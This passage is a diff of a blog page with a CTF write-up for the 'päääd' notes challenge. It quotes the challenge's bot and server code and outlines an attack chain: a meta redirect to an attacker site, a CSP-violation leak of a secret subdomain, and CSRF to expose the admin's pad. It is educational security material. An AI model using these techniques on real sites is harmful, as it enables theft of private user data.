@@ -41,7 +41,7 @@
         <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
     
     
-    <link type="text/css" rel="stylesheet" href=http://example.org/css/styles.9e0c9c20c9de135fbf0d1a5e35f3f000c7d58d3e9c6c89a28a4949621de4cbcc35d02d24302c1f51fce25617455fa140b0db092dc2efcbae1ccee93a5e8a6b65.css integrity="sha512-ngycIMneE1&#43;/DRpeNfPwAMfVjT6cbImiiklJYh3ky8w10C0kMCwfUfziVhdFX6FAsNsJLcLvy64czuk6XoprZQ==" />
+    <link type="text/css" rel="stylesheet" href=http://example.org/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
 <meta name="author" content="Gabriele Musco" />
 
     
@@ -245,176 +245,174 @@
 <h2 id="-initial-analysis">🔎 Initial analysis</h2>
 <p>We are given the application source code and a challenge link. Also there is a <code>bot.js</code> for the admin bot. So it was some client side challenge. Looking at the application,  its main functionality was to create pads (basically notes ) and view them. There was html and markdown allowed in the contents of the pad.</p>
 <p>Looking at the <code>bot.js</code> file .</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-    <span style="color:#8be9fd;font-style:italic">let</span> page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
-
-    <span style="color:#6272a4">// login 
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/user/login`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
-</span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// generate admin creds
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#username&#39;</span>, ADMIN_USERNAME);
-    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#password&#39;</span>, ADMIN_PASSWORD);
-    <span style="color:#6272a4">// click and wait for navigation
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
-        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
-        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
-    ]);
-
-    <span style="color:#6272a4">// create flag pad
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/p/new`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#title&#39;</span>, <span style="color:#f1fa8c">&#39;flag&#39;</span>);
-    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#content&#39;</span>, FLAG);
-    <span style="color:#6272a4">// click and wait for navigation
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
-        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
-        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
-    ])
-
-
-    <span style="color:#6272a4">// avoid leaking anything
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.close();
-    page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
-
-    page.on(<span style="color:#f1fa8c">&#39;console&#39;</span>, (msg) =&gt; {
-        console.log(<span style="color:#f1fa8c">&#39;[Console]&#39;</span>, msg);
-    });
-
-    <span style="color:#6272a4">// open the link
-</span><span style="color:#6272a4"></span>    console.log(<span style="color:#f1fa8c">`Visiting URL: https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> `</span>);
-    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
-
-</code></pre></div><p>After looking at <code>bot.js</code> it&rsquo;s clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#ff79c6">const</span> markdown <span style="color:#ff79c6">=</span> (md) =&gt; {
-        <span style="color:#ff79c6">return</span> md.replace(/__(.*?)__/gs, &#39;&lt;strong&gt;$1&lt;/strong&gt;&#39;)
-            .replace(/_(.*?)_/gs, &#39;&lt;em&gt;$1&lt;/em&gt;&#39;)
-            .replace(/## (.*?)\n/gs, &#39;&lt;h2&gt;$1&lt;/h2&gt;&#39;)
-            .replace(/# (.*?)\n/gs, &#39;&lt;h1&gt;$1&lt;/h1&gt;&#39;)
-            .replace(/!\[(.*?)\]\((.*?)\)/gs, &#39;&lt;img alt=&#34;$1&#34; src=&#34;$2&#34; /&gt;&#39;)
-            .replace(/\[(.*?)\]\((.*?)\)/gs, &#39;&lt;a href=&#34;$2&#34;&gt;$1&lt;/a&gt;&#39;)
-            .replace(/`(.*?)`/gs, &#39;&lt;code&gt;$1&lt;/code&gt;&#39;)
-            .replace(/\n/gs, &#39;&lt;br&gt;&#39;)
-    }
-    <span style="color:#8be9fd;font-style:italic">let</span> md <span style="color:#ff79c6">=</span> markdown(padcontent.dataset.content)
-    <span style="color:#ff79c6">const</span> sanitizer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Sanitizer()
-
-    padcontent.setHTML(md, { sanitizer })
-
-</code></pre></div><p>Looking at the code to create pads at the <code>/p/new</code> endpoint. We can see that there is a cookie called latest being set with a unique_id.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-router.post(<span style="color:#f1fa8c">&#39;/p/new&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
-    <span style="color:#8be9fd;font-style:italic">let</span> {title, content, isPublic, isTemp} <span style="color:#ff79c6">=</span> req.body
-
-    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Pad({
-        username<span style="color:#ff79c6">:</span> req.session.username,
-        title,
-        content,
-        isPublic<span style="color:#ff79c6">:</span> isPublic <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">true</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>,
-        createdAt<span style="color:#ff79c6">:</span> isTemp <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">undefined</span>
-    })
-    console.log(pad)
-    <span style="color:#ff79c6">await</span> pad.save()
-
-    res.cookie(<span style="color:#f1fa8c">&#39;latest&#39;</span>, {title, uniqueId<span style="color:#ff79c6">:</span> pad.uniqueId}, {
-        secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-        httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-        sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;none&#39;</span>,
-    })
-    
-    req.flash(<span style="color:#f1fa8c">&#39;success&#39;</span>, <span style="color:#f1fa8c">&#39;Pad created.&#39;</span>)
-    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)    
-})
-</code></pre></div><p>and the pad can be viewed by visiting that unique subdomain <code>unique_id.paaad.space</code> . Looking at the code for that.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
-     <span style="color:#6272a4">// get id from subdomain
-</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.subdomains[<span style="color:#bd93f9">0</span>]
-    <span style="color:#6272a4">// show the index page
-</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>id){
-        <span style="color:#8be9fd;font-style:italic">let</span> pads <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.find({username<span style="color:#ff79c6">:</span> req.session.username})
-        <span style="color:#ff79c6">return</span> res.render(<span style="color:#f1fa8c">&#39;index&#39;</span>, {
-            username<span style="color:#ff79c6">:</span> req.session.username,
-            latest<span style="color:#ff79c6">:</span> req.cookies.latest,
-            pads
-        })
-    }
-    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-    }
-
-    <span style="color:#6272a4">// find pad with id 
-</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.findOne({uniqueId<span style="color:#ff79c6">:</span> id})
-    
-</code></pre></div><p>here it is taking the id from <code>req.subdomains[0]</code> and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// login 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/user/login`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// generate admin creds
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#username&#39;</span>, ADMIN_USERNAME);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#password&#39;</span>, ADMIN_PASSWORD);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// click and wait for navigation
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
+</span></span><span style="display:flex;"><span>        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
+</span></span><span style="display:flex;"><span>        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
+</span></span><span style="display:flex;"><span>    ]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// create flag pad
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/p/new`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#title&#39;</span>, <span style="color:#f1fa8c">&#39;flag&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#content&#39;</span>, FLAG);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// click and wait for navigation
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
+</span></span><span style="display:flex;"><span>        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
+</span></span><span style="display:flex;"><span>        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// avoid leaking anything
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.close();
+</span></span><span style="display:flex;"><span>    page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    page.on(<span style="color:#f1fa8c">&#39;console&#39;</span>, (msg) =&gt; {
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#f1fa8c">&#39;[Console]&#39;</span>, msg);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// open the link
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    console.log(<span style="color:#f1fa8c">`Visiting URL: https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> `</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
+</span></span></code></pre></div><p>After looking at <code>bot.js</code> it&rsquo;s clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> markdown <span style="color:#ff79c6">=</span> (md) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> md.replace(/__(.*?)__/gs, &#39;&lt;strong&gt;$1&lt;/strong&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/_(.*?)_/gs, &#39;&lt;em&gt;$1&lt;/em&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/## (.*?)\n/gs, &#39;&lt;h2&gt;$1&lt;/h2&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/# (.*?)\n/gs, &#39;&lt;h1&gt;$1&lt;/h1&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/!\[(.*?)\]\((.*?)\)/gs, &#39;&lt;img alt=&#34;$1&#34; src=&#34;$2&#34; /&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/\[(.*?)\]\((.*?)\)/gs, &#39;&lt;a href=&#34;$2&#34;&gt;$1&lt;/a&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/`(.*?)`/gs, &#39;&lt;code&gt;$1&lt;/code&gt;&#39;)
+</span></span><span style="display:flex;"><span>            .replace(/\n/gs, &#39;&lt;br&gt;&#39;)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> md <span style="color:#ff79c6">=</span> markdown(padcontent.dataset.content)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> sanitizer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Sanitizer()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    padcontent.setHTML(md, { sanitizer })
+</span></span></code></pre></div><p>Looking at the code to create pads at the <code>/p/new</code> endpoint. We can see that there is a cookie called latest being set with a unique_id.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.post(<span style="color:#f1fa8c">&#39;/p/new&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> {title, content, isPublic, isTemp} <span style="color:#ff79c6">=</span> req.body
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Pad({
+</span></span><span style="display:flex;"><span>        username<span style="color:#ff79c6">:</span> req.session.username,
+</span></span><span style="display:flex;"><span>        title,
+</span></span><span style="display:flex;"><span>        content,
+</span></span><span style="display:flex;"><span>        isPublic<span style="color:#ff79c6">:</span> isPublic <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">true</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>,
+</span></span><span style="display:flex;"><span>        createdAt<span style="color:#ff79c6">:</span> isTemp <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">undefined</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    console.log(pad)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> pad.save()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res.cookie(<span style="color:#f1fa8c">&#39;latest&#39;</span>, {title, uniqueId<span style="color:#ff79c6">:</span> pad.uniqueId}, {
+</span></span><span style="display:flex;"><span>        secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>        httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>        sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;none&#39;</span>,
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    req.flash(<span style="color:#f1fa8c">&#39;success&#39;</span>, <span style="color:#f1fa8c">&#39;Pad created.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)    
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>and the pad can be viewed by visiting that unique subdomain <code>unique_id.paaad.space</code> . Looking at the code for that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>     <span style="color:#6272a4">// get id from subdomain
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.subdomains[<span style="color:#bd93f9">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// show the index page
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>id){
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> pads <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.find({username<span style="color:#ff79c6">:</span> req.session.username})
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.render(<span style="color:#f1fa8c">&#39;index&#39;</span>, {
+</span></span><span style="display:flex;"><span>            username<span style="color:#ff79c6">:</span> req.session.username,
+</span></span><span style="display:flex;"><span>            latest<span style="color:#ff79c6">:</span> req.cookies.latest,
+</span></span><span style="display:flex;"><span>            pads
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// find pad with id 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> Pad.findOne({uniqueId<span style="color:#ff79c6">:</span> id})
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>here it is taking the id from <code>req.subdomains[0]</code> and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.</p>
 <h2 id="-attack-plan">🥷 Attack plan</h2>
 <p>So if we can manage to somehow get the admin pads unique_id , we can access his pad. So the idea is to somehow leak this unique subdomain. There is another feature of this application that I found interesting, that allows you to view the latest note created by a user.</p>
 <p>Looking at the code for that functionality.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-router.get(<span style="color:#f1fa8c">&#39;/p/latest&#39;</span>, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
-    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>req.cookies.latest){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;No latest päääd.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
-    }
-    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.cookies.latest.uniqueId
-    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-    }
-    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-})
-</code></pre></div><p>Basically, if we visit the endpoint <code>/p/latest</code> with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.get(<span style="color:#f1fa8c">&#39;/p/latest&#39;</span>, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>req.cookies.latest){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;No latest päääd.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> id <span style="color:#ff79c6">=</span> req.cookies.latest.uniqueId
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#f1fa8c">/^[a-f0-9]{48}$/</span>.test(id)){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Invalid päääd id.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>Basically, if we visit the endpoint <code>/p/latest</code> with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad.</p>
 <p>The initial plan is to use csp violations to leak the subdomain. So to do that we have to first redirect the bot to our attacker&rsquo;s website. Since <code>.setHTML()</code> allows meta tags we can use a meta redirect to our attacker controlled website .</p>
 <h2 id="csp-violation-leak-">CSP violation leak 🌟</h2>
 <p>If we put <code>https://xn--pd-viaaa.space/p/latest </code> in an iframe and then add a csp with   <code>frame-src https://xn--pd-viaaa.space/p/latest </code> it will trigger a csp violation , because <code>https://xn--pd-viaaa.space/p/latest </code> redirects to <code>unique_id.xn--pd-viaaa.space</code> .</p>
 <p>So using this technique we can leak the unique_id .</p>
 <h2 id="csrf-to-make-the-note-public-">CSRF to make the note public 🌟</h2>
 <p>After getting the unique id there is still one more problem to solve. The admins pad is not public, so we can&rsquo;t access it directly due to this check.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>pad.isPublic <span style="color:#ff79c6">&amp;&amp;</span> req.session.username <span style="color:#ff79c6">!=</span> pad.username){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Not allowed to access this non-public päääd.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-    }
-</code></pre></div><p>The code to make the note public is as follows.</p>
